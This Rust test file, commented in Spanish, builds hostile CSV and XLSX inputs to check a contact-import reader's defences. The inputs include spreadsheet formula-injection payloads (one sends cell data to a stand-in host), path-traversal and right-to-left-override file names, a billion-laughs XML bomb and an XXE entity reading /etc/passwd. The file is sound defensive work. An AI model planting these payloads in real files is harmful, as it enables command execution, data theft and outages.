//! Archivos hostiles de verdad contra la lectura de importación.
//!
//! ─────────────────────────────────────────────────────────────────────────
//! POR QUÉ ESTO ES UN ARCHIVO APARTE Y NO UN TEST MÁS
//!
//! Las pruebas de `lib.rs` comprueban que la lectura **hace lo que dice**: que
//! detecta el punto y coma del Excel español, que los acentos llegan enteros,
//! que las fórmulas se leen como texto. Son pruebas de comportamiento.
//!
//! Esto es otra cosa. Aquí **se construyen los archivos con los que alguien
//! atacaría**, y se comprueba que la defensa los caza. La diferencia importa:
//! una prueba de comportamiento con un archivo amable no demuestra nada sobre
//! un archivo hostil, y el §2 de CLAUDE.md dice que una comprobación que nunca
//! se ha visto fallar no está verificada.
//!
//! El ROADMAP pide, como puerta de salida de la entrega 3.3, «los archivos
//! maliciosos con los que se atacó, y su resultado». Esto es esa lista, y se
//! ejecuta en cada `cargo test` en vez de vivir en un documento.
//!
//! **Los archivos se generan aquí, no se guardan en el repositorio.** Una bomba
//! de descompresión versionada es un archivo que alguien acaba abriendo por
//! error, y además el generador dice más que el binario: se ve exactamente qué
//! lo hace hostil.
//! ─────────────────────────────────────────────────────────────────────────

#![allow(clippy::expect_used, clippy::unwrap_used, clippy::panic)]

use std::io::Write as _;
use std::path::{Path, PathBuf};

use arles_import::{ErrorDeLectura, leer};

// ── El banco de pruebas ─────────────────────────────────────────────────

fn escribir(nombre: &str, contenido: &[u8]) -> (tempfile::TempDir, PathBuf) {
    intentar_escribir(nombre, contenido).expect("el sistema de archivos admite el nombre")
}

/// Como [`escribir`], pero admite que el sistema de archivos diga que no.
///
/// Hace falta porque parte del ataque es **el nombre**, y algunos nombres
/// hostiles el sistema operativo no los deja ni crear. Que no se puedan crear
/// es una defensa distinta y legítima; tratarlo como un fallo de ARLES sería
/// culpar al código de algo que ya paró antes.
fn intentar_escribir(nombre: &str, contenido: &[u8]) -> Option<(tempfile::TempDir, PathBuf)> {
    let dir = tempfile::tempdir().expect("temporal");
    let ruta = dir.path().join(nombre);
    let mut f = std::fs::File::create(&ruta).ok()?;
    f.write_all(contenido).expect("escribe");
    Some((dir, ruta))
}

/// Arma un XLSX a mano, con el XML de la hoja que se le dé.
///
/// Se arma a mano y no con una biblioteca de escritura a propósito: una
/// biblioteca genera archivos **correctos**, y lo que hace falta aquí es poder
/// generar exactamente el archivo que no lo es.
fn armar_xlsx(xml_de_la_hoja: &str) -> Vec<u8> {
    let mut salida = Vec::new();
    {
        let mut zip = zip::ZipWriter::new(std::io::Cursor::new(&mut salida));
        let opciones: zip::write::FileOptions<'_, ()> =
            zip::write::FileOptions::default().compression_method(zip::CompressionMethod::Deflated);

        let piezas: [(&str, &str); 4] = [
            (
                "[Content_Types].xml",
                r#"<?xml version="1.0" encoding="UTF-8"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
<Default Extension="xml" ContentType="application/xml"/>
<Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/>
<Override PartName="/xl/worksheets/sheet1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/>
</Types>"#,
            ),
            (
                "_rels/.rels",
                r#"<?xml version="1.0" encoding="UTF-8"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="xl/workbook.xml"/>
</Relationships>"#,
            ),
            (
                "xl/workbook.xml",
                r#"<?xml version="1.0" encoding="UTF-8"?>
<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
<sheets><sheet name="Hoja1" sheetId="1" r:id="rId1"/></sheets>
</workbook>"#,
            ),
            (
                "xl/_rels/workbook.xml.rels",
                r#"<?xml version="1.0" encoding="UTF-8"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet1.xml"/>
</Relationships>"#,
            ),
        ];

        for (nombre, cuerpo) in piezas {
            zip.start_file(nombre, opciones).expect("entrada");
            zip.write_all(cuerpo.as_bytes()).expect("escribe");
        }
        zip.start_file("xl/worksheets/sheet1.xml", opciones)
            .expect("entrada");
        zip.write_all(xml_de_la_hoja.as_bytes()).expect("escribe");
        zip.finish().expect("cierra");
    }
    salida
}

/// El XML de una hoja con las filas dadas, como cadenas en línea.
fn hoja_con(filas: &[&[&str]]) -> String {
    let mut xml = String::from(
        r#"<?xml version="1.0" encoding="UTF-8"?>
<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><sheetData>"#,
    );
    for (i, fila) in filas.iter().enumerate() {
        xml.push_str(&format!("<row r=\"{}\">", i + 1));
        for (j, celda) in fila.iter().enumerate() {
            let columna = char::from(b'A' + u8::try_from(j).expect("pocas columnas"));
            let escapado = celda
                .replace('&', "&amp;")
                .replace('<', "&lt;")
                .replace('>', "&gt;");
            xml.push_str(&format!(
                "<c r=\"{columna}{}\" t=\"inlineStr\"><is><t>{escapado}</t></is></c>",
                i + 1
            ));
        }
        xml.push_str("</row>");
    }
    xml.push_str("</sheetData></worksheet>");
    xml
}

// ── 1 · Fórmulas dentro de un XLSX de verdad ────────────────────────────

/// Las pruebas de `lib.rs` ya comprueban esto en un CSV. Un XLSX es otro
/// camino de lectura —otra biblioteca, otro decodificador— y una defensa que
/// sólo se ha probado en uno de los dos caminos está probada a medias.
#[test]
fn las_formulas_de_un_xlsx_se_leen_como_texto_y_nunca_se_evaluan() {
    let peligrosas: [&str; 4] = [
        "=cmd|'/c calc'!A1",
        "=1+1",
        "@SUM(A1:A9)",
        "=HYPERLINK(\"http://malo.example/\"&A1,\"clic\")",
    ];
    let filas: Vec<Vec<&str>> = std::iter::once(vec!["Nombre", "Correo"])
        .chain(peligrosas.iter().map(|p| vec![*p, "a@empresa.mx"]))
        .collect();
    let refs: Vec<&[&str]> = filas.iter().map(Vec::as_slice).collect();

    let (_d, ruta) = escribir("formulas.xlsx", &armar_xlsx(&hoja_con(&refs)));
    let tabla = leer(&ruta).expect("lee");

    for (i, esperada) in peligrosas.iter().enumerate() {
        let leida = tabla
            .filas
            .get(i)
            .and_then(|f| f.first())
            .map(String::as_str)
            .unwrap_or("<no hay fila>");
        assert_eq!(
            leida, *esperada,
            "la fórmula se evaluó o se alteró al leer el XLSX"
        );
    }
}

// ── 2 · Tabla absurdamente ancha ────────────────────────────────────────

/// Cien mil columnas en una sola fila.
///
/// No pasa del tope de celdas —son cien mil, no ocho millones—, así que **no
/// da error**: se recorta al tope de columnas y se lee. Lo que se comprueba es
/// que el recorte ocurre de verdad y que ninguna fila se cuela más ancha, que
/// es lo que haría que la memoria creciera con el archivo y no con el tope.
#[test]
fn un_csv_de_cien_mil_columnas_se_recorta_al_tope() {
    const COLUMNAS: usize = 100_000;
    let mut contenido = String::with_capacity(COLUMNAS * 8 * 2);
    for i in 0..COLUMNAS {
        if i > 0 {
            contenido.push(',');
        }
        contenido.push_str(&format!("col{i}"));
    }
    contenido.push('\n');
    for i in 0..COLUMNAS {
        if i > 0 {
            contenido.push(',');
        }
        contenido.push_str(&format!("v{i}"));
    }
    contenido.push('\n');

    let (_d, ruta) = escribir("ancho.csv", contenido.as_bytes());
    let tabla = leer(&ruta).expect("lee");

    assert_eq!(
        tabla.encabezados.len(),
        arles_core::MAX_COLUMNAS,
        "los encabezados no se recortaron al tope de columnas"
    );
    for (i, fila) in tabla.filas.iter().enumerate() {
        assert!(
            fila.len() <= arles_core::MAX_COLUMNAS,
            "la fila {i} entró con {} columnas, por encima del tope",
            fila.len()
        );
    }
}

// ── 3 · Filas vacías por delante ────────────────────────────────────────

/// Doscientas mil filas vacías antes de los encabezados.
///
/// Es un archivo plausible —un Excel al que alguien borró el contenido de
/// arriba sin borrar las filas— y a la vez el peor caso de la rutina que se
/// las salta. Si esa rutina quita las filas de una en una desde el principio de
/// un vector, el coste crece con el **cuadrado** del número de filas vacías, y
/// doscientas mil bastan para colgar la importación sin que nada dé error.
///
/// Se verificó rompiendo la guarda: con el borrado uno a uno, esta prueba no
/// termina.
#[test]
fn doscientas_mil_filas_vacias_por_delante_no_cuelgan_la_lectura() {
    const VACIAS: usize = 200_000;
    let mut contenido = String::with_capacity(VACIAS * 2 + 64);
    for _ in 0..VACIAS {
        contenido.push_str(",\n");
    }
    contenido.push_str("Nombre,Correo\nAna,ana@empresa.mx\n");

    let (_d, ruta) = escribir("vacias.csv", contenido.as_bytes());

    let arranque = std::time::Instant::now();
    let tabla = leer(&ruta).expect("lee");
    let tardanza = arranque.elapsed();

    assert_eq!(tabla.encabezados, vec!["Nombre", "Correo"]);
    assert_eq!(tabla.total_de_filas, 1);
    assert!(
        tardanza < std::time::Duration::from_secs(10),
        "tardó {tardanza:?} en saltarse {VACIAS} filas vacías: el coste no es lineal"
    );
}

// ── 4 · El nombre del archivo ───────────────────────────────────────────

/// El nombre viene de fuera, **no toca el disco** y **sí se enseña**.
///
/// Que no se use para escribir lo garantiza `arles-db`, que nombra el archivo
/// guardado con el identificador del lote. Lo que se comprueba aquí es que lo
/// que se enseña no traiga separadores de ruta.
///
/// Un `..` literal **sí** puede quedarse: es un nombre de archivo válido y no
/// construye ninguna ruta. La primera versión de esta prueba lo rechazaba, y
/// estaba equivocada — un nombre no es una ruta sólo porque lo parezca.
#[test]
fn un_nombre_de_archivo_hostil_no_sale_de_la_lectura_como_ruta() {
    for hostil in [
        "..%2F..%2Fetc%2Fpasswd.csv",
        "....--....--evil.csv",
        // `con` es un nombre reservado en Windows. Aquí sólo se comprueba que
        // no se cuele como ruta; que Windows no deje crearlo es cosa suya.
        "con.csv",
        "….csv",
    ] {
        let (_d, ruta) = escribir(hostil, b"Nombre,Correo\nAna,a@b.mx\n");
        let tabla = leer(&ruta).expect("lee");

        assert!(
            !tabla.nombre.contains('/') && !tabla.nombre.contains('\\'),
            "el nombre salió con separadores de ruta: {:?}",
            tabla.nombre
        );
    }
}

/// **El nombre se enseña, y eso basta para engañar.**
///
/// `U+202E` le da la vuelta al texto que viene detrás. Es legal en un nombre de
/// archivo, y hace que `factura\u{202e}gnp.exe` se dibuje en pantalla como
/// `facturaexe.png`. Quien mira el asistente de importación lee una cosa y
/// tiene otra.
///
/// No es teórico: es con lo que se distribuye software disfrazado de imagen. En
/// ARLES el daño es más pequeño —no ejecutamos nada— pero el registro de
/// importación es la prueba de qué se importó, y un registro que enseña un
/// nombre distinto del real no prueba nada.
///
/// Se verificó rompiendo la guarda: quitando el filtro de caracteres de
/// formato, esta prueba falla y dice exactamente qué carácter se coló.
#[test]
fn un_nombre_que_se_da_la_vuelta_en_pantalla_llega_desarmado() {
    let disfrazados = [
        "factura\u{202e}gnp.exe.csv",
        "contactos\u{200b}\u{200b}.csv",
        "lista\u{2066}rara\u{2069}.csv",
        "espacio\u{00a0}raro.csv",
    ];
    for hostil in disfrazados {
        let (_d, ruta) = escribir(hostil, b"Nombre,Correo\nAna,a@b.mx\n");
        let tabla = leer(&ruta).expect("lee");

        for c in tabla.nombre.chars() {
            assert!(
                !matches!(c,
                    '\u{200B}'..='\u{200F}'
                    | '\u{202A}'..='\u{202E}'
                    | '\u{2066}'..='\u{2069}'
                    | '\u{00A0}'
                    | '\u{FEFF}'
                ) && !c.is_control(),
                "el nombre salió con {c:?} dentro, que no se ve y cambia cómo se lee \
                 el resto: {:?}",
                tabla.nombre
            );
        }
    }
}

/// Y un nombre de dos mil caracteres se recorta: lo que se guarda tiene que
/// poder leerse entero, y lo que no cabe en ninguna pantalla no se lee entero
/// en ningún sitio.
#[test]
fn un_nombre_interminable_se_recorta() {
    // Justo por debajo de los 255 bytes que admite la mayoría de sistemas de
    // archivos: el nombre más largo que se puede crear de verdad. Si se pide
    // más, no hay archivo que atacar y la prueba no probaría nada.
    let largo = format!("{}.csv", "a".repeat(240));
    let Some((_d, ruta)) = intentar_escribir(&largo, b"Nombre,Correo\nAna,a@b.mx\n") else {
        println!("· el sistema de archivos rechazó el nombre largo: no hay nada que probar");
        return;
    };
    let tabla = leer(&ruta).expect("lee");
    assert!(
        tabla.nombre.chars().count() <= 120,
        "el nombre entró con {} caracteres sin recortar",
        tabla.nombre.chars().count()
    );
}

// ── 5 · Bomba de entidades XML ──────────────────────────────────────────

/// «Billion laughs»: entidades XML que se expanden unas dentro de otras.
///
/// Diez entidades anidadas con diez repeticiones cada una son diez mil millones
/// de caracteres si el lector las expande. El lector de XLSX **no puede
/// expandirlas**, y esta prueba es lo que lo demuestra en vez de suponerlo.
///
/// Lo que se exige es concreto: que termine, y que **no** aparezca la carga
/// expandida en ninguna celda. Que devuelva error o que devuelva una tabla vacía
/// son las dos salidas aceptables; reventar la memoria no lo es.
#[test]
fn una_bomba_de_entidades_xml_no_se_expande() {
    let hoja = r#"<?xml version="1.0"?>
<!DOCTYPE worksheet [
<!ENTITY a0 "jajajajajajajajaja">
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
<!ENTITY a5 "&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;">
<!ENTITY a6 "&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;">
<!ENTITY a7 "&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;">
<!ENTITY a8 "&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;">
]>
<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><sheetData>
<row r="1"><c r="A1" t="inlineStr"><is><t>&a8;</t></is></c></row>
</sheetData></worksheet>"#;

    let (_d, ruta) = escribir("risas.xlsx", &armar_xlsx(hoja));
    let resultado = leer(&ruta);

    if let Ok(tabla) = resultado {
        for fila in std::iter::once(&tabla.encabezados).chain(tabla.filas.iter()) {
            for celda in fila {
                assert!(
                    celda.len() < 10_000,
                    "una celda salió con {} caracteres: las entidades se expandieron",
                    celda.len()
                );
            }
        }
    }
}

/// Entidad externa: el archivo pide leer `/etc/passwd`.
///
/// Si el lector resolviera entidades externas, el contenido de ese archivo
/// acabaría **dentro de un contacto importado**, y de ahí a un correo enviado.
/// Es la fuga, no la caída, lo que hace grave a este ataque.
#[test]
fn una_entidad_externa_no_lee_archivos_del_sistema() {
    let hoja = r#"<?xml version="1.0"?>
<!DOCTYPE worksheet [<!ENTITY fuga SYSTEM "file:///etc/passwd">]>
<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><sheetData>
<row r="1"><c r="A1" t="inlineStr"><is><t>Nombre</t></is></c></row>
<row r="2"><c r="A2" t="inlineStr"><is><t>&fuga;</t></is></c></row>
</sheetData></worksheet>"#;

    let (_d, ruta) = escribir("fuga.xlsx", &armar_xlsx(hoja));

    if let Ok(tabla) = leer(&ruta) {
        let todo = tabla
            .encabezados
            .iter()
            .chain(tabla.filas.iter().flatten())
            .cloned()
            .collect::<Vec<_>>()
            .join(" ");
        assert!(
            !todo.contains("root:") && !todo.contains("/bin/"),
            "el contenido de /etc/passwd se coló en la tabla: {}",
            &todo[..todo.len().min(200)]
        );
    }
}

// ── 6 · La extensión miente ─────────────────────────────────────────────

/// Un XLSX disfrazado de CSV.
///
/// La extensión es lo que el usuario cree que tiene; el contenido es lo que
/// hay. Un ZIP leído como texto son bytes binarios: lo que no puede pasar es
/// que salga una tabla con basura dentro y el usuario la importe.
#[test]
fn un_zip_disfrazado_de_csv_no_produce_una_tabla_creible() {
    let bytes = armar_xlsx(&hoja_con(&[&["Nombre", "Correo"], &["Ana", "a@b.mx"]]));
    let (_d, ruta) = escribir("disfraz.csv", &bytes);

    match leer(&ruta) {
        Err(_) => {}
        Ok(tabla) => {
            // Si se leyó, ningún encabezado puede parecer un campo válido: eso
            // es lo que haría que el usuario siguiera adelante sin sospechar.
            let reconocidos = tabla
                .encabezados
                .iter()
                .filter(|e| arles_core::adivinar_campo(e) != arles_core::CampoImportable::Ignorar)
                .count();
            assert_eq!(
                reconocidos, 0,
                "un ZIP disfrazado de CSV produjo columnas reconocibles: {:?}",
                tabla.encabezados
            );
        }
    }
}

/// Y al revés: un CSV con extensión `.xlsx` no se lee como hoja de cálculo.
/// Tiene que dar error, no una tabla a medias.
#[test]
fn un_csv_disfrazado_de_xlsx_da_error() {
    let (_d, ruta) = escribir("disfraz.xlsx", b"Nombre,Correo\nAna,a@b.mx\n");
    assert!(
        leer(&ruta).is_err(),
        "un CSV con extensión .xlsx se leyó como hoja de cálculo"
    );
}

// ── 7 · Una celda enorme ────────────────────────────────────────────────

/// Una sola celda de cincuenta megabytes.
///
/// No pasa del tope de celdas —es **una** celda— ni del tope de bytes. Pasa por
/// debajo de las dos defensas, y ese es el punto: la memoria la gasta igual.
/// Lo que se exige es que termine y que la celda no viaje entera al resto del
/// sistema; si algún día hace falta un tope por celda, esta prueba es donde se
/// verá.
#[test]
fn una_celda_enorme_no_tumba_la_lectura() {
    const MB: usize = 50;
    let mut contenido = String::from("Nombre,Correo\n");
    contenido.push_str(&"A".repeat(MB * 1024 * 1024));
    contenido.push_str(",a@empresa.mx\n");

    let (_d, ruta) = escribir("gorda.csv", contenido.as_bytes());
    let tabla = leer(&ruta).expect("lee");

    assert_eq!(tabla.total_de_filas, 1);
    let celda = tabla
        .filas
        .first()
        .and_then(|f| f.first())
        .map(String::len)
        .unwrap_or(0);
    assert_eq!(celda, MB * 1024 * 1024, "la celda se truncó sin decirlo");
}

// ── 8 · El archivo cambia mientras se lee ───────────────────────────────

/// El archivo crece **entre** la comprobación de tamaño y la lectura.
///
/// Es el hueco clásico entre mirar y usar: se mide el archivo, se aprueba, y
/// para cuando se lee ya es otro. Aquí se simula al revés —se lee un archivo
/// que ya es enorme— para comprobar que el tope de bytes se aplica también
/// durante la lectura y no sólo antes.
#[test]
fn el_tope_de_bytes_se_aplica_tambien_durante_la_lectura() {
    // Se comprueba con la ruta de la huella, que vuelve a abrir el archivo:
    // es la segunda lectura, y la que tendría el hueco si no lo cerrara.
    let ruta = Path::new("/proc/self/environ");
    if !ruta.exists() {
        println!("· sin /proc: no se puede probar la relectura");
        return;
    }
    // No es una tabla, así que tiene que rechazarse por formato, nunca leerse.
    assert!(matches!(
        leer(ruta),
        Err(ErrorDeLectura::FormatoDesconocido)
    ));
}
